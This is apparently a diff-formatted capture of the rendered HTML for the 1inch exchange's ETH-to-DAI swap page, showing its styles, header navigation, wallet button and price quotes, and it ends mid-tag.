+</style><style>[_nghost-ipc-c167]{display:block;position:relative;width:343px;float:right;opacity:0;transition:opacity .3s}.visible[_nghost-ipc-c167]{opacity:1}.popup-cross-icon[_ngcontent-ipc-c167]{position:absolute;top:12px;right:12px;color:var(--1inch-common-text-01);opacity:.6;z-index:2}.popup-cross-icon[_ngcontent-ipc-c167]:hover{opacity:1;transition:.2s}</style><style>[_nghost-ipc-c166]{display:grid;grid-template-columns:1fr;position:relative;min-height:152px;border-radius:16px;padding:16px;background:url(/assets/images/earn-banner.png),#060A0F;background-size:cover;overflow:hidden}.left-col[_ngcontent-ipc-c166]{display:flex;flex-direction:column;justify-content:space-between;max-width:150px}.text[_ngcontent-ipc-c166]{line-height:19px;font-size:16px;font-weight:500;color:var(--1inch-common-text-01)}.link[_ngcontent-ipc-c166]{padding:8px 24px;font-weight:500;border-radius:8px;cursor:pointer;width:-moz-fit-content;width:fit-content;background:var(--1inch-common-text-01);color:var(--1inch-common-text-10)}.link[_ngcontent-ipc-c166]:hover{text-decoration:none}</style></head>
+
+<body id="body" class="full-page-content light-theme is-uni">
+    <div class="body-scroll">
+        <app-root class="h-full" _nghost-ipc-c301="" ng-version="13.2.2"><tui-root _ngcontent-ipc-c301="" data-tui-version="2.33.0" _nghost-ipc-c161="" style="--tui-duration: 100ms;"><tui-scroll-controls _ngcontent-ipc-c161="" class="scrollbar ng-tns-c147-3 ng-star-inserted" _nghost-ipc-c147=""><div _ngcontent-ipc-c147="" tuiscrollbarwrapper="" class="bar bar_vertical ng-tns-c147-3 ng-trigger ng-trigger-tuiFadeIn ng-star-inserted"><div _ngcontent-ipc-c147="" tuiscrollbar="vertical" class="thumb ng-tns-c147-3" style="top: 0%; height: 97%;"></div></div><!----><!----><!----><!----></tui-scroll-controls><!----><tui-svg-defs-host _ngcontent-ipc-c161="" _nghost-ipc-c160=""><svg _ngcontent-ipc-c160="" version="1.1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><!----><!----><!----><!----></svg></tui-svg-defs-host><tui-portal-host _ngcontent-ipc-c161="" _nghost-ipc-c124=""><div _ngcontent-ipc-c124="" class="position-fixed-offset"></div><div _ngcontent-ipc-c161="" class="content"><mat-drawer-container _ngcontent-ipc-c301="" autosize="" class="mat-drawer-container drawer-wrap mat-drawer-container-explicit-backdrop"><div class="mat-drawer-backdrop ng-star-inserted"></div><!----><div class="cdk-visually-hidden cdk-focus-trap-anchor" aria-hidden="true"></div><!--mat-drawer-anchor--><div class="cdk-visually-hidden cdk-focus-trap-anchor" aria-hidden="true"></div><mat-drawer-content class="mat-drawer-content ng-star-inserted"><div _ngcontent-ipc-c301="" class="example-sidenav-content"><div _ngcontent-ipc-c301="" class="ng-star-inserted"><div _ngcontent-ipc-c301="" class="app-header-wrap"><app-header _ngcontent-ipc-c301="" _nghost-ipc-c297="" class="ng-star-inserted"><div _ngcontent-ipc-c297="" class="header"><div _ngcontent-ipc-c297="" class="page-content"><div _ngcontent-ipc-c297="" class="header-content"><div _ngcontent-ipc-c297="" class="header-left-col"><!----><a _ngcontent-ipc-c297="" href="/" class="logo-color ng-star-inserted"><svg _ngcontent-ipc-c297="" width="132" height="50" class="header-logo-desktop ng-star-inserted"><use _ngcontent-ipc-c297="" xlink:href="assets/images/logo.svg#logo"></use></svg><svg _ngcontent-ipc-c297="" width="32" height="32" class="header-logo-mobile ng-star-inserted"><use _ngcontent-ipc-c297="" xlink:href="assets/images/logo_small.svg#logo_small"></use></svg><!----></a><!----><!----><div _ngcontent-ipc-c297="" class="header-nav-menu"><app-header-nav-menu _ngcontent-ipc-c297="" _nghost-ipc-c271=""><div _ngcontent-ipc-c271="" class="nav-menu"><div _ngcontent-ipc-c271="" class="nav-menu-item focusable ng-star-inserted" tabindex="0" data-id="nav-menu.trade"><!----><app-sub-nav-item _ngcontent-ipc-c271="" _nghost-ipc-c270="" class="ng-star-inserted"><tui-hosted-dropdown _ngcontent-ipc-c270="" dropdownhover="" tuidropdownalign="left" class="nav-menu-dropdown" _nghost-ipc-c178="" id="dropdown-navigation.trade"><div _ngcontent-ipc-c178="" class="wrapper"><!----><span _ngcontent-ipc-c270="" class="nav-menu-item-title">Trade</span><svg _ngcontent-ipc-c270="" width="16" height="16" class="nav-menu-item-arrow ng-star-inserted"><use _ngcontent-ipc-c270="" xlink:href="assets/images/icons/arrow.svg#arrow"></use></svg><!----><!----><!----><!----></div></tui-hosted-dropdown><!----></app-sub-nav-item><!----><!----></div><!----><!----><div _ngcontent-ipc-c271="" class="nav-menu-item focusable ng-star-inserted" tabindex="0" data-id="nav-menu.dao"><!----><app-sub-nav-item _ngcontent-ipc-c271="" _nghost-ipc-c270="" class="ng-star-inserted"><tui-hosted-dropdown _ngcontent-ipc-c270="" dropdownhover="" tuidropdownalign="left" class="nav-menu-dropdown" _nghost-ipc-c178="" id="dropdown-navigation.dao"><div _ngcontent-ipc-c178="" class="wrapper"><!----><span _ngcontent-ipc-c270="" class="nav-menu-item-title">DAO</span><svg _ngcontent-ipc-c270="" width="16" height="16" class="nav-menu-item-arrow ng-star-inserted"><use _ngcontent-ipc-c270="" xlink:href="assets/images/icons/arrow.svg#arrow"></use></svg><!----><!----><!----><!----></div></tui-hosted-dropdown><!----></app-sub-nav-item><!----><!----></div><!----><!----><div _ngcontent-ipc-c271="" class="nav-menu-item no-dropdown ng-star-inserted" tabindex="-1"><!----><a _ngcontent-ipc-c271="" routerlinkactive="nav-menu-link-text-active" class="nav-menu-link-text ng-star-inserted" href="#/1/earn"><span _ngcontent-ipc-c271="">Earn</span></a><!----><!----><!----><!----></div><!----><!----><!----><!----><div _ngcontent-ipc-c271="" class="nav-menu-item focusable ng-star-inserted" tabindex="0"><!----><app-sub-nav-item _ngcontent-ipc-c271="" _nghost-ipc-c270="" class="ng-star-inserted"><tui-hosted-dropdown _ngcontent-ipc-c270="" dropdownhover="" tuidropdownalign="left" class="nav-menu-dropdown" _nghost-ipc-c178="" id="dropdown-navigation.more"><div _ngcontent-ipc-c178="" class="wrapper"><!----><span _ngcontent-ipc-c270="" class="nav-menu-item-title">More</span><svg _ngcontent-ipc-c270="" width="16" height="16" class="nav-menu-item-arrow ng-star-inserted"><use _ngcontent-ipc-c270="" xlink:href="assets/images/icons/arrow.svg#arrow"></use></svg><!----><!----><!----><!----></div></tui-hosted-dropdown><!----></app-sub-nav-item><!----><!----></div><!----><!----><div _ngcontent-ipc-c271="" class="nav-menu-item focusable ng-star-inserted" tabindex="0"><!----><app-sub-nav-item _ngcontent-ipc-c271="" _nghost-ipc-c270="" class="ng-star-inserted"><tui-hosted-dropdown _ngcontent-ipc-c270="" dropdownhover="" tuidropdownalign="left" class="nav-menu-dropdown" _nghost-ipc-c178="" id="dropdown-navigation.bridges"><div _ngcontent-ipc-c178="" class="wrapper"><!----><span _ngcontent-ipc-c270="" class="nav-menu-item-title">Bridges</span><svg _ngcontent-ipc-c270="" width="16" height="16" class="nav-menu-item-arrow ng-star-inserted"><use _ngcontent-ipc-c270="" xlink:href="assets/images/icons/arrow.svg#arrow"></use></svg><!----><!----><!----><!----></div></tui-hosted-dropdown><!----></app-sub-nav-item><!----><!----></div><!----><!----><div _ngcontent-ipc-c271="" class="nav-menu-item no-dropdown ng-star-inserted" tabindex="-1"><a _ngcontent-ipc-c271="" rel="noopener noreferrer" target="_blank" class="nav-menu-link-text nav-menu-item-link-external ng-star-inserted" href="https://buy.moonpay.io/?apiKey=pk_live_q9RGNNxVw8kvQF87xk9SgL5ZwAfT4O5h&amp;currencyCode=ETH"><span _ngcontent-ipc-c271="">Buy ETH</span></a><!----><!----><!----><!----><!----></div><!----><!----><!----></div></app-header-nav-menu></div></div><div _ngcontent-ipc-c297="" class="header-buttons"><div _ngcontent-ipc-c297="" class="header-button-wrap ng-star-inserted"><app-header-network-switch _ngcontent-ipc-c297="" _nghost-ipc-c273=""><div _ngcontent-ipc-c273="" class="networks-wrap ng-star-inserted"><div _ngcontent-ipc-c273=""><div _ngcontent-ipc-c273="" class="network-switch-desktop"><app-header-button _ngcontent-ipc-c273="" data-id="header.switch-network-button" _nghost-ipc-c272=""><button _ngcontent-ipc-c272="" class="header-button header-button-blue"><svg _ngcontent-ipc-c272="" width="24" height="24" class="ng-star-inserted"><use _ngcontent-ipc-c272="" xlink:href="/assets/images/network-logos/ethereum-transparent.svg#ethereum"></use></svg><!----><span _ngcontent-ipc-c272="" class="header-button-text ng-star-inserted">Ethereum</span><!----><svg _ngcontent-ipc-c272="" width="16" height="16" class="header-button-arrow-icon ng-star-inserted"><use _ngcontent-ipc-c272="" xlink:href="assets/images/icons/arrow.svg#arrow"></use></svg><!----></button></app-header-button></div><div _ngcontent-ipc-c273="" class="network-switch-mobile"><app-header-button _ngcontent-ipc-c273="" _nghost-ipc-c272=""><button _ngcontent-ipc-c272="" class="header-button header-button-blue"><svg _ngcontent-ipc-c272="" width="24" height="24" class="ng-star-inserted"><use _ngcontent-ipc-c272="" xlink:href="/assets/images/network-logos/ethereum-transparent.svg#ethereum"></use></svg><!----><!----><svg _ngcontent-ipc-c272="" width="16" height="16" class="header-button-arrow-icon ng-star-inserted"><use _ngcontent-ipc-c272="" xlink:href="assets/images/icons/arrow.svg#arrow"></use></svg><!----></button></app-header-button></div></div><!----></div><!----></app-header-network-switch></div><!----><div _ngcontent-ipc-c297="" class="header-account-button-wrap"><app-header-button _ngcontent-ipc-c297="" walletconnect="" icon="/assets/images/icons/wallet.svg#wallet" color="light-blue" data-id="header.connect-wallet-button" class="header-account-button-host ng-star-inserted" _nghost-ipc-c272=""><button _ngcontent-ipc-c272="" class="header-button header-button-light-blue"><svg _ngcontent-ipc-c272="" width="24" height="24" class="ng-star-inserted"><use _ngcontent-ipc-c272="" xlink:href="/assets/images/icons/wallet.svg#wallet"></use></svg><!----><span _ngcontent-ipc-c272="" class="header-button-text ng-star-inserted">Connect Wallet</span><!----><!----></button></app-header-button><!----><!----><button _ngcontent-ipc-c297="" aria-haspopup="true" data-id="header.settings-button" class="mat-menu-trigger header-settings-button"><svg _ngcontent-ipc-c297="" width="24" height="24"><use _ngcontent-ipc-c297="" xlink:href="/assets/images/icons/settings4.svg#settings4"></use></svg></button><!----><mat-menu _ngcontent-ipc-c297="" hasbackdrop="true" backdropclass="fix-mat-menu-bg" classlist="fix-mat-cdk-overlay-panel" xposition="before" class="ng-star-inserted"><!----></mat-menu><!----></div><!----><div _ngcontent-ipc-c297="" class="header-burger-icon"><app-header-button _ngcontent-ipc-c297="" icon="/assets/images/icons/menu_2.svg#menu" _nghost-ipc-c272=""><button _ngcontent-ipc-c272="" class="header-button header-button- header-button-without-text"><svg _ngcontent-ipc-c272="" width="24" height="24" class="ng-star-inserted"><use _ngcontent-ipc-c272="" xlink:href="/assets/images/icons/menu_2.svg#menu"></use></svg><!----><!----><!----></button></app-header-button></div></div></div></div><!----></div><!----><!----><!----></app-header><!----><!----></div><div _ngcontent-ipc-c301="" class="page-content page-content-wrap"><router-outlet _ngcontent-ipc-c301=""></router-outlet><simple-swap-layout _nghost-ipc-c335="" id="uni" class="ng-star-inserted"><router-outlet _ngcontent-ipc-c335=""></router-outlet><swap-container _nghost-ipc-c353="" class="ng-star-inserted"><router-outlet _ngcontent-ipc-c353=""></router-outlet><swap-form _nghost-ipc-c366="" class="ng-star-inserted"><div _ngcontent-ipc-c366="" class="swap-form-header"><trade-menu _ngcontent-ipc-c366="" _nghost-ipc-c355=""><a _ngcontent-ipc-c355="" routerlinkactive="trade-menu-item__active" class="trade-menu-item ng-star-inserted trade-menu-item__active" data-id="trade-menu.simple-swap-tab" href="#/1/swap/ETH/DAI"><span _ngcontent-ipc-c355="">Swap</span><!----></a><a _ngcontent-ipc-c355="" routerlinkactive="trade-menu-item__active" class="trade-menu-item trade-menu-item__additional ng-star-inserted" data-id="market-limit-box.limit-tab" href="#/1/classic/limit-order/WETH/DAI"><span _ngcontent-ipc-c355="">Limit</span><app-active-orders-count _nghost-ipc-c354="" class="ng-star-inserted"><!----><!----><!----><!----></app-active-orders-count><!----><!----><!----></a><!----></trade-menu><div _ngcontent-ipc-c366="" class="swap-form-actions"><button _ngcontent-ipc-c366="" data-id="swap-box.refresh-button" class="refresh-icon blank-button"><arrow-locator-loading _ngcontent-ipc-c366="" _nghost-ipc-c356=""><svg _ngcontent-ipc-c356="" id="arrow_loading" xmlns="http://www.w3.org/2000/svg" viewBox="-6 -6 36 36" class="arrow-loading" width="36" height="36"><path _ngcontent-ipc-c356="" stroke="none" fill="none" d="M16.2751 7.78995C13.932 5.44681 10.133 5.44681 7.78986 7.78995C7.02853 8.55128 6.51457 9.4663 6.24798 10.4351C6.24473 10.4499 6.24114 10.4646 6.23719 10.4793C6.17635 10.7064 6.12938 10.9339 6.09577 11.161C5.83159 12.9457 6.39255 14.7026 7.52624 15.9944C7.61054 16.0901 7.69842 16.1838 7.78986 16.2752C8.08307 16.5685 8.39909 16.825 8.7322 17.0448C9.25533 17.3892 9.84172 17.6568 10.4798 17.8278C10.7386 17.8971 10.9979 17.9484 11.2565 17.9825C12.9537 18.2061 14.6187 17.6866 15.8747 16.6415C16.0123 16.5265 16.1459 16.4044 16.2751 16.2752C16.2848 16.2655 16.2947 16.2561 16.3047 16.2469C17.0123 15.531 17.5491 14.627 17.8283 13.5851C17.9712 13.0517 18.5196 12.7351 19.053 12.878C19.5865 13.021 19.9031 13.5693 19.7602 14.1028C19.3141 15.7676 18.3745 17.1684 17.1409 18.1899C16.1883 18.9822 15.0949 19.5189 13.9515 19.8002C11.8607 20.3147 9.6028 19.9749 7.7328 18.7809C7.06855 18.3579 6.47841 17.8432 5.97519 17.2589C5.12341 16.2738 4.55173 15.1302 4.26015 13.9324C4.01698 12.9416 3.96104 11.8931 4.12168 10.8379C4.36697 9.20484 5.1183 7.63309 6.37564 6.37574C9.49984 3.25154 14.5652 3.25154 17.6894 6.37574L18.2332 6.91959L18.2337 5.49951C18.2338 5.05769 18.5921 4.69964 19.034 4.69979C19.4758 4.69995 19.8338 5.05825 19.8337 5.50007L19.8325 9.03277L19.8322 9.8325L19.0325 9.83249L18.9401 9.83249C18.8146 9.85665 18.6854 9.85665 18.5599 9.83248L15.5005 9.83245C15.0587 9.83245 14.7005 9.47427 14.7005 9.03244C14.7005 8.59062 15.0587 8.23245 15.5005 8.23245L16.7176 8.23246L16.2751 7.78995Z" class="background-path"></path><defs _ngcontent-ipc-c356=""><path _ngcontent-ipc-c356="" id="arrow" stroke="none" fill="none" d="M16.2751 7.78995C13.932 5.44681 10.133 5.44681 7.78986 7.78995C7.02853 8.55128 6.51457 9.4663 6.24798 10.4351C6.24473 10.4499 6.24114 10.4646 6.23719 10.4793C6.17635 10.7064 6.12938 10.9339 6.09577 11.161C5.83159 12.9457 6.39255 14.7026 7.52624 15.9944C7.61054 16.0901 7.69842 16.1838 7.78986 16.2752C8.08307 16.5685 8.39909 16.825 8.7322 17.0448C9.25533 17.3892 9.84172 17.6568 10.4798 17.8278C10.7386 17.8971 10.9979 17.9484 11.2565 17.9825C12.9537 18.2061 14.6187 17.6866 15.8747 16.6415C16.0123 16.5265 16.1459 16.4044 16.2751 16.2752C16.2848 16.2655 16.2947 16.2561 16.3047 16.2469C17.0123 15.531 17.5491 14.627 17.8283 13.5851C17.9712 13.0517 18.5196 12.7351 19.053 12.878C19.5865 13.021 19.9031 13.5693 19.7602 14.1028C19.3141 15.7676 18.3745 17.1684 17.1409 18.1899C16.1883 18.9822 15.0949 19.5189 13.9515 19.8002C11.8607 20.3147 9.6028 19.9749 7.7328 18.7809C7.06855 18.3579 6.47841 17.8432 5.97519 17.2589C5.12341 16.2738 4.55173 15.1302 4.26015 13.9324C4.01698 12.9416 3.96104 11.8931 4.12168 10.8379C4.36697 9.20484 5.1183 7.63309 6.37564 6.37574C9.49984 3.25154 14.5652 3.25154 17.6894 6.37574L18.2332 6.91959L18.2337 5.49951C18.2338 5.05769 18.5921 4.69964 19.034 4.69979C19.4758 4.69995 19.8338 5.05825 19.8337 5.50007L19.8325 9.03277L19.8322 9.8325L19.0325 9.83249L18.9401 9.83249C18.8146 9.85665 18.6854 9.85665 18.5599 9.83248L15.5005 9.83245C15.0587 9.83245 14.7005 9.47427 14.7005 9.03244C14.7005 8.59062 15.0587 8.23245 15.5005 8.23245L16.7176 8.23246L16.2751 7.78995Z"></path><clipPath _ngcontent-ipc-c356="" id="arrow-clip"><use _ngcontent-ipc-c356="" xlink:href="#arrow"></use></clipPath></defs><g _ngcontent-ipc-c356="" clip-path="url(#arrow-clip)"><circle _ngcontent-ipc-c356="" cx="12" cy="12" r="5" transform="rotate(365,12,12)" fill="none" stroke="currentColor" stroke-width="16" stroke-dasharray="30" stroke-dashoffset="0"><animate _ngcontent-ipc-c356="" attributeName="stroke-dashoffset" values="0;-30" begin="arrow_loading.click; 0.7s" repeatCount="indefinite" dur="9.3s"></animate></circle></g><use _ngcontent-ipc-c356="" xlink:href="#arrow"></use><animateTransform _ngcontent-ipc-c356="" id="transform_0" attributeName="transform" attributeType="XML" type="rotate" from="0 0 0" to="-10 0 0" dur="0.07s" begin="arrow_loading.click;" repeatCount="1"></animateTransform><animateTransform _ngcontent-ipc-c356="" id="transform_1" attributeName="transform" attributeType="XML" type="rotate" from="-45 0 0" to="390 0 0" dur="0.6s" begin="transform_0.end" repeatCount="1"></animateTransform><animateTransform _ngcontent-ipc-c356="" id="transform_2" attributeName="transform" attributeType="XML" type="rotate" from="390 0 0" to="360 0 0" dur="0.15s" begin="transform_1.end" repeatCount="1"></animateTransform></svg></arrow-locator-loading></button><a _ngcontent-ipc-c366="" routerlink="settings" data-id="advanced-settings-button" class="settings-icon" href="#/1/swap/ETH/DAI/settings"><svg _ngcontent-ipc-c366="" width="24" height="24"><use _ngcontent-ipc-c366="" xlink:href="assets/images/simple/icons/swap-settings.svg#swap-settings"></use></svg></a></div></div><token-select-input _ngcontent-ipc-c366="" _nghost-ipc-c357="" class="ng-untouched ng-pristine ng-valid"><div _ngcontent-ipc-c357="" class="source-layout-row ng-star-inserted"><a _ngcontent-ipc-c357="" target="_blank" class="source-layout-title"><!----> From <!----><!----></a><!----></div><!----><div _ngcontent-ipc-c357="" class="source-layout-row"><div _ngcontent-ipc-c357="" class="select-source-token-lock-wrap"><a _ngcontent-ipc-c357="" data-id="swap-box.src-token.dropdown-button" class="select-source-token ng-star-inserted" href="#/1/swap/ETH/DAI/select-source-token"><token-select-button _ngcontent-ipc-c357="" _nghost-ipc-c339=""><token-icon _ngcontent-ipc-c339="" class="token-icon ng-star-inserted" _nghost-ipc-c311=""><span _ngcontent-ipc-c311="" class="image_stub ng-star-inserted" style="font-size: 13px; line-height: 15px;">E</span><img _ngcontent-ipc-c311="" class="image ng-star-inserted" alt="ETH" src="https://tokens.1inch.io/0xeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeee.png" style="height: 100%; width: 100%; display: block;"><!----><!----></token-icon><!----><div _ngcontent-ipc-c339="" tuihintdirection="top-right" class="token-symbol ng-star-inserted">ETH</div><!----><!----><!----><!----><!----><!----><button _ngcontent-ipc-c339="" tabindex="-1" class="token-select-icon blank-button ng-star-inserted"><svg _ngcontent-ipc-c339="" width="17" height="17"><use _ngcontent-ipc-c339="" xlink:href="assets/images/simple/icons/arrow-down.svg#arrow-down"></use></svg></button><!----><!----></token-select-button></a><!----><!----><!----></div><div _ngcontent-ipc-c357="" class="source-token-amount-input-container ng-star-inserted"><amount-input _ngcontent-ipc-c357="" data-id="swap-box.src-token-input" class="token-amount-input ng-untouched ng-pristine ng-valid" _nghost-ipc-c308="" title="1"><tui-input-number _ngcontent-ipc-c308="" replaceamountinputcomma="" doubleclickselection="" copynumberprocessor="" min="0" tuitextfieldautocomplete="off" class="amount-input ng-untouched ng-pristine ng-valid" _nghost-ipc-c227=""><tui-primitive-textfield _ngcontent-ipc-c227="" tuivalueaccessor="" tuitextfieldinputmode="decimal" class="textfield" _nghost-ipc-c221="" data-size="l" style="--border-start: 0rem; --border-end: 0rem;"><!----><tui-wrapper _ngcontent-ipc-c221="" automation-id="tui-primitive-textfield__wrapper" tuipreventdefault="click" class="tui-autofill" _nghost-ipc-c140="" style="--text-indent: 0px;" data-appearance="textfield"><input _ngcontent-ipc-c221="" tuimaskaccessor="" automation-id="tui-primitive-textfield__native-input" class="input ng-untouched ng-pristine ng-valid" autocomplete="off" type="text" id="tui_interactive_21647884733081" maxlength="23" aria-placeholder="" aria-invalid="false" inputmode="decimal" x-inputmode="decimal" tabindex="0" aria-describedby="tui_interactive_21647884733081_described-by"><!----><div _ngcontent-ipc-c221="" class="content"><!----><div _ngcontent-ipc-c221="" class="wrapper"><label _ngcontent-ipc-c221="" automation-id="tui-primitive-textfield__placeholder" class="placeholder placeholder_raised ng-star-inserted" for="tui_interactive_21647884733081"></label><!----><tui-value-decoration _ngcontent-ipc-c221="" automation-id="tui-primitive-textfield__value-decoration" aria-hidden="true" class="t-value-decoration" _nghost-ipc-c224=""><span _ngcontent-ipc-c224="" subtree="" characterdata="" wamutationobserver=""></span><span _ngcontent-ipc-c224="" class="t-ghost">1</span><span _ngcontent-ipc-c224="" class="t-filler"></span>
+
+</tui-value-decoration></div><!----><!----><!----><!----></div></tui-wrapper></tui-primitive-textfield></tui-input-number></amount-input><!----><!----><!----><!----><!----></div><!----><!----></div><div _ngcontent-ipc-c357="" class="source-layout-row ng-star-inserted"><div _ngcontent-ipc-c357="" class="token-name">Ethereum</div><div _ngcontent-ipc-c357="" data-id="swap-box.source-token.usd-price" class="source-token-amount-usd-price ng-star-inserted"><usd-token-price _ngcontent-ipc-c357="" size="small" _nghost-ipc-c239=""><span _ngcontent-ipc-c239="" class="small ng-star-inserted"><span _ngcontent-ipc-c239="" class="token-usd-price ng-star-inserted"> ~$2,918 </span><!----><!----><!----><!----><!----><!----></span><!----></usd-token-price></div><!----></div><!----></token-select-input><swap-separator _ngcontent-ipc-c366="" _nghost-ipc-c341="" class="rotatable ng-star-inserted"><div _ngcontent-ipc-c341="" class="swap-direction-arrow-container"><!----><a _ngcontent-ipc-c341="" data-id="swap-box.change-token-places-button" class="swap-direction-arrow ng-star-inserted" href="#/1/swap/ETH/DAI/reverse"><svg _ngcontent-ipc-c341="" width="12" height="12" class="ng-star-inserted"><use _ngcontent-ipc-c341="" xlink:href="assets/images/simple/icons/swap-direction-arrow.svg#swap-direction-arrow"></use></svg><!----></a><!----></div><!----></swap-separator><!----><!----><swap-destination-token _ngcontent-ipc-c366="" _nghost-ipc-c360=""><div _ngcontent-ipc-c360="" class="destination-token-container"><div _ngcontent-ipc-c360="" class="destination-top-row"><a _ngcontent-ipc-c360="" target="_blank" transloco="uni.swap.estimated" class="destination-top-row-title" href="https://etherscan.io/token/0x6b175474e89094c44da98b954eedeac495271d0f">To (estimated)</a><!----><!----></div><a _ngcontent-ipc-c360="" routerlink="select-destination-token" data-id="swap-box.dst-token.dropdown-button" class="select-destination-token ng-star-inserted" disabled="false" href="#/1/swap/ETH/DAI/select-destination-token"><token-select-button _ngcontent-ipc-c360="" _nghost-ipc-c339=""><token-icon _ngcontent-ipc-c339="" class="token-icon ng-star-inserted" _nghost-ipc-c311=""><span _ngcontent-ipc-c311="" class="image_stub ng-star-inserted" style="font-size: 13px; line-height: 15px;">D</span><img _ngcontent-ipc-c311="" class="image ng-star-inserted" alt="DAI" src="https://tokens.1inch.io/0x6b175474e89094c44da98b954eedeac495271d0f.png" style="height: 100%; width: 100%; display: block;"><!----><!----></token-icon><!----><div _ngcontent-ipc-c339="" tuihintdirection="top-right" class="token-symbol ng-star-inserted">DAI</div><!----><!----><!----><!----><!----><!----><button _ngcontent-ipc-c339="" tabindex="-1" class="token-select-icon blank-button ng-star-inserted"><svg _ngcontent-ipc-c339="" width="17" height="17"><use _ngcontent-ipc-c339="" xlink:href="assets/images/simple/icons/arrow-down.svg#arrow-down"></use></svg></button><!----><!----></token-select-button></a><!----><!----></div><div _ngcontent-ipc-c360="" data-id="quotes-box" class="quotes-list ng-star-inserted"><button _ngcontent-ipc-c360="" data-id="quote" class="blank-button quote-preview active ng-star-inserted" tabindex="0"><quote-preview _ngcontent-ipc-c360="" _nghost-ipc-c359=""><div _ngcontent-ipc-c359="" class="quote-container"><div _ngcontent-ipc-c359="" class="quote-data-wrap ng-star-inserted"><div _ngcontent-ipc-c359="" class="save-amount ng-star-inserted"> Primary </div><!----><div _ngcontent-ipc-c359="" class="quote-data"><div _ngcontent-ipc-c359="" class="quote-data-row"><div _ngcontent-ipc-c359="" class="market-name-container"><button _ngcontent-ipc-c359="" class="blank-button market-expand" tabindex="-1"><span _ngcontent-ipc-c359=""><span _ngcontent-ipc-c359="" class="market-name">1inch</span><!----><span _ngcontent-ipc-c359="" class="arrow-down"></span></span></button></div><div _ngcontent-ipc-c359="" class="token-amount-container ng-star-inserted"><span _ngcontent-ipc-c359="" class="token-amount" title="2 909.59119"> 2 909.59119 </span></div><!----></div><div _ngcontent-ipc-c359="" class="quote-data-row"><div _ngcontent-ipc-c359="" class="quote-preview-tx-cost"><span _ngcontent-ipc-c359="" transloco="uni.swap.tx-cost">Tx cost</span><!----><usd-token-price _ngcontent-ipc-c359="" _nghost-ipc-c239=""><span _ngcontent-ipc-c239="" class="ng-star-inserted"><!----><span _ngcontent-ipc-c239="" class="ng-star-inserted">&nbsp;</span><span _ngcontent-ipc-c239="" class="ng-star-inserted"> 0.0074 Ξ </span><!----><!----><!----><!----><!----><span _ngcontent-ipc-c239="" class="ng-star-inserted">&nbsp;</span><!----><span _ngcontent-ipc-c239="" class="ng-star-inserted">(</span><span _ngcontent-ipc-c239="" class="ng-star-inserted">~$21.6</span><span _ngcontent-ipc-c239="" class="ng-star-inserted">)</span><!----><!----><!----><!----><!----></span><!----></usd-token-price></div><div _ngcontent-ipc-c359="" class="quote-token-amount-usd-price"><usd-swap-price _ngcontent-ipc-c359="" _nghost-ipc-c338=""><!----><span _ngcontent-ipc-c338="" class="ng-star-inserted"><usd-token-price _ngcontent-ipc-c338="" _nghost-ipc-c239="" class="ng-star-inserted"><span _ngcontent-ipc-c239="" class="ng-star-inserted"><span _ngcontent-ipc-c239="" class="token-usd-price ng-star-inserted"> ~$2,911 </span><!----><!----><!----><!----><!----><!----></span><!----></usd-token-price><swap-price-impact _ngcontent-ipc-c338="" _nghost-ipc-c337="" data-id="swap-price-impact" class="ng-star-inserted"><span _ngcontent-ipc-c337=""><span _ngcontent-ipc-c337="" class="ng-star-inserted">(-0.26%)<!----><!----><!----><!----><!----></span><!----><!----></span></swap-price-impact><!----><!----></span><!----></usd-swap-price></div></div></div></div><!----></div><!----><!----></quote-preview></button><button _ngcontent-ipc-c360="" data-id="quote" class="blank-button quote-preview ng-star-inserted" tabindex="0"><quote-preview _ngcontent-ipc-c360="" _nghost-ipc-c359=""><div _ngcontent-ipc-c359="" class="quote-container"><div _ngcontent-ipc-c359="" class="quote-data-wrap ng-star-inserted"><!----><div _ngcontent-ipc-c359="" class="quote-data"><div _ngcontent-ipc-c359="" class="quote-data-row"><div _ngcontent-ipc-c359="" class="market-name-container selectable"><button _ngcontent-ipc-c359="" class="blank-button market-expand" tabindex="0" data-id="quotes-expander"><span _ngcontent-ipc-c359=""><span _ngcontent-ipc-c359="" class="market-name">SushiSwap</span><!----><span _ngcontent-ipc-c359="" class="arrow-down"></span></span></button></div><div _ngcontent-ipc-c359="" class="token-amount-container ng-star-inserted"><span _ngcontent-ipc-c359="" class="token-amount" title="2 909.59119"> 2 909.59119 </span></div><!----></div><div _ngcontent-ipc-c359="" class="quote-data-row"><div _ngcontent-ipc-c359="" class="quote-preview-tx-cost"><span _ngcontent-ipc-c359="" transloco="uni.swap.tx-cost">Tx cost</span><!----><usd-token-price _ngcontent-ipc-c359="" _nghost-ipc-c239=""><span _ngcontent-ipc-c239="" class="ng-star-inserted"><!----><span _ngcontent-ipc-c239="" class="ng-star-inserted">&nbsp;</span><span _ngcontent-ipc-c239="" class="ng-star-inserted"> 0.0074 Ξ </span><!----><!----><!----><!----><!----><span _ngcontent-ipc-c239="" class="ng-star-inserted">&nbsp;</span><!----><span _ngcontent-ipc-c239="" class="ng-star-inserted">(</span><span _ngcontent-ipc-c239="" class="ng-star-inserted">~$21.6</span><span _ngcontent-ipc-c239="" class="ng-star-inserted">)</span><!----><!----><!----><!----><!----></span><!----></usd-token-price></div><div _ngcontent-ipc-c359="" class="quote-token-amount-usd-price"><usd-swap-price _ngcontent-ipc-c359="" _nghost-ipc-c338=""><!----><span _ngcontent-ipc-c338="" class="ng-star-inserted"><usd-token-price _ngcontent-ipc-c338="" _nghost-ipc-c239="" class="ng-star-inserted"><span _ngcontent-ipc-c239="" class="ng-star-inserted"><span _ngcontent-ipc-c239="" class="token-usd-price ng-star-inserted"> ~$2,911 </span><!----><!----><!----><!----><!----><!----></span><!----></usd-token-price><swap-price-impact _ngcontent-ipc-c338="" _nghost-ipc-c337="" data-id="swap-price-impact" class="ng-star-inserted"><span _ngcontent-ipc-c337=""><span _ngcontent-ipc-c337="" class="ng-star-inserted">(-0.26%)<!----><!----><!----><!----><!----></span><!----><!----></span></swap-price-impact><!----><!----></span><!----></usd-swap-price></div></div></div></div><!----></div><!----><!----></quote-preview></button><button _ngcontent-ipc-c360="" data-id="quote" class="blank-button quote-preview ng-star-inserted" tabindex="-1"><quote-preview _ngcontent-ipc-c360="" _nghost-ipc-c359=""><div _ngcontent-ipc-c359="" class="quote-container"><div _ngcontent-ipc-c359="" class="quote-data-wrap ng-star-inserted"><!----><div _ngcontent-ipc-c359="" class="quote-data"><div _ngcontent-ipc-c359="" class="quote-data-row"><div _ngcontent-ipc-c359="" class="market-name-container"><button _ngcontent-ipc-c359="" class="blank-button 